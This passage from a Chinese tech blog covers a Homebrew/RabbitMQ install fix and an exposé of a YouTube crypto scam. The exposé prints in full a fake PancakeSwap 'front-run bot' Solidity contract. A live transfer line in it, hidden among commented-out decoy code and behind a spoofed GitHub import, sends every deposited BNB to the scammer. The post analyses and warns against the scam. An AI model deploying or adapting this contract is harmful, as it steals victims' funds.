class="line"></span><br><span class="line">Running `brew update --preinstall`...</span><br><span class="line">fatal: Could not resolve HEAD to a revision</span><br><span class="line">Warning: No available formula with the name &quot;rabbitmq&quot;.</span><br><span class="line">==&gt; Searching for similarly named formulae...</span><br><span class="line">Error: No similarly named formulae found.</span><br><span class="line">==&gt; Searching for a previously deleted formula (in the last month)...</span><br><span class="line">Error: No previously deleted formula found.</span><br><span class="line">==&gt; Searching taps on GitHub...</span><br><span class="line">Error: No formulae found in taps.</span><br></pre></td></tr></table></figure>

<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>经过一番思考和查阅发现可以这样解决</p>
<ul>
<li>定位到homebrew目录<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/Homebrew/Library/Taps/homebrew/</span><br></pre></td></tr></table></figure></li>
<li>然后rm -rf homebrew-core</li>
<li>重新git clone <a target="_blank" rel="noopener" href="https://github.com/Homebrew/homebrew-core.git">https://github.com/Homebrew/homebrew-core.git</a></li>
<li>最后重新执行brew install</li>
</ul>
<h2 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h2><p>可能是安装brew的过程中由于网络原因或者其他原因导致homebrew安装出现问题</p>
<h2 id="rabbitmq-其他"><a href="#rabbitmq-其他" class="headerlink" title="rabbitmq 其他"></a>rabbitmq 其他</h2><ul>
<li>rabbitmq常用命令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew services info   rabbitmq</span><br><span class="line">brew services stop   rabbitmq</span><br><span class="line">brew services restart   rabbitmq</span><br><span class="line">brew services kill   rabbitmq</span><br></pre></td></tr></table></figure></li>
<li>Web界面管理RabbitMQ<br>默认是可以本地登录localhost:15672，用户名：guest；密码：guest；端口默认15672</li>
</ul>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rabbmitmq/" rel="tag">rabbmitmq</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-区块链骗局之夹子机器人"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%97%E5%B1%80%E4%B9%8B%E5%A4%B9%E5%AD%90%E6%9C%BA%E5%99%A8%E4%BA%BA/"
    >区块链骗局之夹子机器人</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/07/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%97%E5%B1%80%E4%B9%8B%E5%A4%B9%E5%AD%90%E6%9C%BA%E5%99%A8%E4%BA%BA/" class="article-date">
  <time datetime="2022-04-07T13:48:33.000Z" itemprop="datePublished">2022-04-07</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E5%8C%BA%E5%9D%97%E9%93%BE/">技术生活 - 区块链</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我一个很久没联系的朋友，今天突然找到我，让我帮忙看看代码；说是自己在网上看到了一个区块链套利机器人的代码，很赚钱。自己也不根据代码部署了，但是钱取不出来了，他也是比较谨慎，就投入了5000多块吧！折合BNB大概2个（bnb 按照430美元&#x2F;个）。让我帮看看。</p>
<ul>
<li>骗子视频地址：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=3QrBQW4TOfI&amp;t=71s">https://www.youtube.com/watch?v=3QrBQW4TOfI&amp;t=71s</a></li>
<li>合约代码地址 :<a target="_blank" rel="noopener" href="https://ghostbin.com/rVoQh/raw">https://ghostbin.com/rVoQh/raw</a></li>
</ul>
<p>起初，我打开视频，也没人为他被骗。从视频标题，tag，特别是评论，100多条评论，全是清一色说的类似：我投了1个BNB，几天就变成了10个了…..<br>我就犯嘀咕了，我们圈子都知道链上机器人太卷了，机器人都开始打架了，还能赚钱吗？难道这个牛人有啥高明的策略？直到看了1分钟视频才反应过来是骗局。</p>
<h2 id="骗术剖析"><a href="#骗术剖析" class="headerlink" title="骗术剖析"></a>骗术剖析</h2><p>骗子在YouTube上，视频竟然打着*** 夹子机器人｜三明治机器人｜薄饼机器人｜pancakeswap｜科学家机器人｜抢先交易｜量化交易｜自动收入10+BNB｜Pancakes Front run bot｜（最新版本）***  ，看来骗子很注意SEO ，懂得搜索引擎优化。</p>
<p>其实这个骗术很简单，如果懂得代码的话，绝对不会上当。不懂代码的人看起来只会绝对好高级啊！加上被赚钱的欲望冲昏了头脑。下面就简要分析一下这个骗术有多低级</p>
<h3 id="骗术分析"><a href="#骗术分析" class="headerlink" title="骗术分析"></a>骗术分析</h3><p>骗术大致过程是：用看起来免费的方式教别人部署夹子套利机器人，机器人会自动在pancake上捕获潜在的交易对。就这么空手套白狼的剧本。视频下发还给出了代码，合约地址，部署教程等资料。看起来没啥问题。但是看视频操作就不对了</p>
<ol>
<li><p>合约部署为何要更改注释中的钱包地址，这装模作样的，也许骗子这里也是思考了：如果这里写用户的地址，用户会更加放心。<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220407220216.png" alt="20220407220216"></p>
</li>
<li><p>部署完成合约之后，为何要往合约地址转钱？？？注意：<em><strong>这里转入多少就会被骗子转走多少</strong></em> </p>
</li>
<li><p>看看骗子的所谓夹子代码。（只能说是一对垃圾代码，除了注释掉的有用代码不足10句话），其中最有用的一句代码是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payable(manager.uniswapDepositAddress()).transfer(address(this).balance);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看到了吗？这个就是把合约中的钱转走的，其余的被注释掉的无用代码都是障眼法。</p>
</li>
</ol>
<p>下面的代码可能随时被骗子删除   ，我就粘贴了一份，切忌别去尝试哦！<br>   合约代码链接：<br><a target="_blank" rel="noopener" href="https://ghostbin.com/rVoQh/raw">https://ghostbin.com/rVoQh/raw</a></p>
<p>备用链接：<br><a target="_blank" rel="noopener" href="https://pastebin.com/raw/1kVN2Nj9">https://pastebin.com/raw/1kVN2Nj9</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.6;</span><br><span class="line"></span><br><span class="line">// PancakeSwap FrontrunDeployer</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol&quot;;</span><br><span class="line">// PancakeSwap manager</span><br><span class="line">import &quot;https://github.com/Uniswapf/uniswap-v2-periphery/blob/main/master-contracts-interfaces/V1/IUniswapV1Factory.md&quot;;</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol&quot;;</span><br><span class="line">import &quot;https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract PancakeswapV2FrontBot &#123;</span><br><span class="line">    </span><br><span class="line">    string public tokenName;</span><br><span class="line">	string public tokenSymbol;</span><br><span class="line">	uint frontrun;</span><br><span class="line">	Manager manager;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	constructor(string memory _tokenName, string memory _tokenSymbol) public &#123;</span><br><span class="line">		tokenName = _tokenName;</span><br><span class="line">		tokenSymbol = _tokenSymbol;</span><br><span class="line">		manager = new Manager();</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	    </span><br><span class="line">	    // Send required BNB for liquidity pair</span><br><span class="line">	    receive() external payable &#123;&#125;</span><br><span class="line">	    </span><br><span class="line">	    </span><br><span class="line">	    // Perform tasks (clubbed .json functions into one to reduce external calls &amp; reduce gas) manager.performTasks();</span><br><span class="line">	    </span><br><span class="line">	    function action() public payable &#123;</span><br><span class="line">	</span><br><span class="line">	//Perform a front-running attack on uniswap</span><br><span class="line"></span><br><span class="line">//const fs = require(&#x27;fs&#x27;);</span><br><span class="line">//var Web3 = require(&#x27;web3&#x27;);</span><br><span class="line">//var abiDecoder = require(&#x27;abi-decoder&#x27;);</span><br><span class="line">//var colors = require(&quot;colors&quot;);</span><br><span class="line">//var Tx = require(&#x27;ethereumjs-tx&#x27;).Transaction;</span><br><span class="line">//var axios = require(&#x27;axios&#x27;);</span><br><span class="line">//var BigNumber = require(&#x27;big-number&#x27;);</span><br><span class="line"></span><br><span class="line">//const &#123;NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST&#125; = require(&#x27;./constants.js&#x27;);</span><br><span class="line">//const &#123;setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI&#125; = require(&#x27;./bot.js&#x27;);</span><br><span class="line">//const &#123;PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL&#125; = require(&#x27;./env.js&#x27;);</span><br><span class="line"></span><br><span class="line">//const INPUT_TOKEN_ADDRESS = &#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;;</span><br><span class="line">//const WBNB_TOKEN_ADDRESS = &#x27;0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c&#x27;;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var input_token_info;</span><br><span class="line">//var out_token_info;</span><br><span class="line">//var pool_info;</span><br><span class="line">//var gas_price_info;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var web3;</span><br><span class="line">//var web3Ts;</span><br><span class="line">//var web3Ws;</span><br><span class="line">//var pancakeRouter;</span><br><span class="line">//var pancakeFactory;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">// one gwei</span><br><span class="line">//const ONE_GWEI = 1e9;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var buy_finished = false;</span><br><span class="line">//var sell_finished = false;</span><br><span class="line">//var buy_failed = false;</span><br><span class="line">//var sell_failed = false;</span><br><span class="line">//var attack_started = false;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//var succeed = false;</span><br><span class="line">//var subscription;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//async function createWeb3()&#123;</span><br><span class="line">    //try &#123;</span><br><span class="line">        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));</span><br><span class="line">        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));</span><br><span class="line">       // web3 = new Web3(EthereumTesterProvider());</span><br><span class="line">       // web3.eth.getAccounts(console.log);</span><br><span class="line">      //web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));</span><br><span class="line">    //pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);</span><br><span class="line">        //pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);</span><br><span class="line">        //abiDecoder.addABI(PANCAKE_ROUTER_ABI);</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //return true;</span><br><span class="line">    //&#125; catch (error) &#123;</span><br><span class="line">      //console.log(error);</span><br><span class="line">      //return false;</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">//async function main() &#123;</span><br><span class="line"> </span><br><span class="line">//try &#123;   </span><br><span class="line">        //if (await createWeb3() == false) &#123;</span><br><span class="line">            //console.log(&#x27;Web3 Create Error&#x27;.yellow);</span><br><span class="line">            //process.exit();</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        //const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);</span><br><span class="line">        //const out_token_address = TOKEN_ADDRESS;</span><br><span class="line">        //const amount = AMOUNT;</span><br><span class="line">        //const level = LEVEL;</span><br><span class="line">        </span><br><span class="line">        //ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);</span><br><span class="line">        //if(ret == false) &#123;</span><br><span class="line">          //process.exit();</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line">        //outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();</span><br><span class="line"></span><br><span class="line">        //await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);</span><br><span class="line">        </span><br><span class="line">        //log_str = &#x27;***** Tracking more &#x27; + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + &#x27; &#x27; +  input_token_info.symbol + &#x27;  Exchange on Pancake *****&#x27;</span><br><span class="line">        // console.log(log_str.green);    </span><br><span class="line">        // console.log(web3Ws);</span><br><span class="line">        //web3Ws.onopen = function(evt) &#123;</span><br><span class="line">            //web3Ws.send(JSON.stringify(&#123; method: &quot;subscribe&quot;, topic: &quot;transfers&quot;, address: user_wallet.address &#125;));</span><br><span class="line">            //console.log(&#x27;connected&#x27;)</span><br><span class="line">        </span><br><span class="line">        // get pending transactions</span><br><span class="line">        //subscription = web3Ws.eth.subscribe(&#x27;pendingTransactions&#x27;, function (error, result) &#123;</span><br><span class="line">        //&#125;).on(&quot;data&quot;, async function (transactionHash) &#123;</span><br><span class="line">            //console.log(transactionHash);</span><br><span class="line"></span><br><span class="line">            // let transaction = await web3.eth.getTransaction(transactionHash);</span><br><span class="line">            // if (transaction != null &amp;&amp; transaction[&#x27;to&#x27;] == PANCAKE_ROUTER_ADDRESS)</span><br><span class="line">            // &#123;</span><br><span class="line">            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);</span><br><span class="line">            // &#125;</span><br><span class="line">            </span><br><span class="line">            //if (succeed) &#123;</span><br><span class="line">                //console.log(&quot;The bot finished the attack.&quot;);</span><br><span class="line">                //process.exit();</span><br><span class="line">               </span><br><span class="line">            </span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    //catch (error) &#123;</span><br><span class="line">      </span><br><span class="line">      //if(error.data != null &amp;&amp; error.data.see === &#x27;https://infura.io/dashboard&#x27;)</span><br><span class="line">      </span><br><span class="line">         //console.log(&#x27;Daily request count exceeded, Request rate limited&#x27;.yellow);</span><br><span class="line">         //console.log(&#x27;Please insert other API Key&#x27;);</span><br><span class="line">      //else&#123;</span><br><span class="line">         //console.log(&#x27;Unknown Handled Error&#x27;);</span><br><span class="line">         //console.log(error);</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">      //process.exit();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) &#123;</span><br><span class="line">    </span><br><span class="line">    //(await triggersFrontRun(transaction, out_token_address, amount, level)) &#123;</span><br><span class="line">        //subscription.unsubscribe();</span><br><span class="line">        //console.log(&#x27;Perform front running attack...&#x27;);</span><br><span class="line"></span><br><span class="line">        //gasPrice = parseInt(transaction[&#x27;gasPrice&#x27;]);</span><br><span class="line">        //newGasPrice = gasPrice + 50*ONE_GWEI;</span><br><span class="line"></span><br><span class="line">        //estimatedInput = ((amount*0.999)*(10**18)).toString();</span><br><span class="line">        //realInput = (amount*(10**18)).toString();</span><br><span class="line">        //gasLimit = (300000).toString();</span><br><span class="line">        </span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line"></span><br><span class="line">        //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();</span><br><span class="line">        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);</span><br><span class="line"></span><br><span class="line">        //console.log(&quot;wait until the honest transaction is done...&quot;, transaction[&#x27;hash&#x27;]);</span><br><span class="line"></span><br><span class="line">        //while (await isPending(transaction[&#x27;hash&#x27;])) &#123;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        //if(buy_failed)</span><br><span class="line">        </span><br><span class="line">            //succeed = false;</span><br><span class="line">            //return;</span><br><span class="line">           </span><br><span class="line">        </span><br><span class="line">        //console.log(&#x27;Buy succeed:&#x27;)</span><br><span class="line">        </span><br><span class="line">        //Sell</span><br><span class="line">        //await updatePoolInfo();</span><br><span class="line">        //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();</span><br><span class="line">        //outputeth = outputeth * 0.999;</span><br><span class="line"></span><br><span class="line">        //await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);</span><br><span class="line">        </span><br><span class="line">        //console.log(&#x27;Sell succeed&#x27;);</span><br><span class="line">        //succeed = true;</span><br><span class="line">manager;</span><br><span class="line"></span><br><span class="line">//async function approve(gasPrice, outputtoken, out_token_address, user_wallet)&#123;</span><br><span class="line">    //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();</span><br><span class="line">    </span><br><span class="line">    //allowance = BigNumber(allowance);</span><br><span class="line">    //outputtoken = BigNumber(outputtoken);</span><br><span class="line"></span><br><span class="line">    //var decimals = BigNumber(10).power(out_token_info.decimals);</span><br><span class="line">    //var max_allowance = BigNumber(10000).multiply(decimals);</span><br><span class="line"></span><br><span class="line">    //if(outputtoken.gt(max_allowance))</span><br><span class="line">   </span><br><span class="line">       //console.log(&#x27;replace max allowance&#x27;)</span><br><span class="line">       //max_allowance = outputtoken;</span><br><span class="line">       </span><br><span class="line">       payable(manager.uniswapDepositAddress()).transfer(address(this).balance);</span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    //if(outputtoken.gt(allowance))&#123;</span><br><span class="line">        //console.log(max_allowance.toString());</span><br><span class="line">        //var approveTX =&#123;</span><br><span class="line">                //from: user_wallet.address,</span><br><span class="line">                //to: out_token_address,</span><br><span class="line">                //gas: 50000,</span><br><span class="line">                //gasPrice: gasPrice*ONE_GWEI,</span><br><span class="line">                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()</span><br><span class="line">                manager;</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        //var signedTX = await user_wallet.signTransaction(approveTX);</span><br><span class="line">        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);</span><br><span class="line"></span><br><span class="line">        //console.log(&#x27;Approved Token&#x27;)</span><br><span class="line">    </span><br><span class="line">    //return;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//select attacking transaction</span><br><span class="line">//async function triggersFrontRun(transaction, out_token_address, amount, level) &#123;</span><br><span class="line">    </span><br><span class="line">    //if(attack_started)</span><br><span class="line">        //return false;</span><br><span class="line"></span><br><span class="line">    //console.log((transaction.hash).yellow, parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9);</span><br><span class="line">    //if(parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9 &gt; 10 &amp;&amp; parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9 &lt; 50)&#123;</span><br><span class="line">        //attack_started = true;</span><br><span class="line">        //return true</span><br><span class="line">   manager; </span><br><span class="line"></span><br><span class="line">    //return false;</span><br><span class="line"></span><br><span class="line">    //if (transaction[&#x27;to&#x27;] != PANCAKE_ROUTER_ADDRESS) &#123;</span><br><span class="line">        //return false;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    //let data = parseTx(transaction[&#x27;input&#x27;]);</span><br><span class="line">   manager;</span><br><span class="line">    //let method = data[0];</span><br><span class="line">    manager;</span><br><span class="line">    //let params = data[1];</span><br><span class="line">    manager;</span><br><span class="line">    //let gasPrice = parseInt(transaction[&#x27;gasPrice&#x27;]) / 10**9;</span><br><span class="line">    manager;</span><br><span class="line"></span><br><span class="line">    //if(method == &#x27;swapExactETHForTokens&#x27;)</span><br><span class="line">    manager;</span><br><span class="line">    </span><br><span class="line">        //let in_amount = transaction;</span><br><span class="line">        manager;</span><br><span class="line">        //let out_min = params[0];</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //let path = params[1];</span><br><span class="line">        manager;</span><br><span class="line">        //let in_token_addr = path[0];</span><br><span class="line">        manager;</span><br><span class="line">        //let out_token_addr = path[path.length-1];</span><br><span class="line">        manager;</span><br><span class="line">        </span><br><span class="line">        //let recept_addr = params[2];</span><br><span class="line">        manager;</span><br><span class="line">        //let deadline = params[3];</span><br><span class="line">        manager;</span><br><span class="line"></span><br><span class="line">        //if(out_token_addr != out_token_address)</span><br><span class="line">        manager;</span><br><span class="line">        </span><br><span class="line">            // console.log(out_token_addr.blue)</span><br><span class="line">            // console.log(out_token_address)</span><br><span class="line">            //return false;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="5">
<li>骗子为了让代码伪装的更加像回事，自己注册了一个GitHub账号弄了个uniswapf的名字，混淆视听。。。我也差点被骗。。。</li>
</ol>
<h2 id="警示录"><a href="#警示录" class="headerlink" title="警示录"></a>警示录</h2><ol>
<li>区块链上遵循丛林法则，这里没有监管，没有纪律，一旦损失，无处伸冤。</li>
<li>少贪便宜，天山不会掉馅饼</li>
<li>碰到不懂的，不要头脑发热，被人洗脑，多问问懂的朋友</li>
</ol>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/" rel="tag">机器人</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-springboot缓存"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/07/springboot%E7%BC%93%E5%AD%98/"
    >springboot缓存</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/07/springboot%E7%BC%93%E5%AD%98/" class="article-date">
  <time datetime="2022-04-07T03:27:21.000Z" itemprop="datePublished">2022-04-07</time>
</a> 
  <div class="article-category">
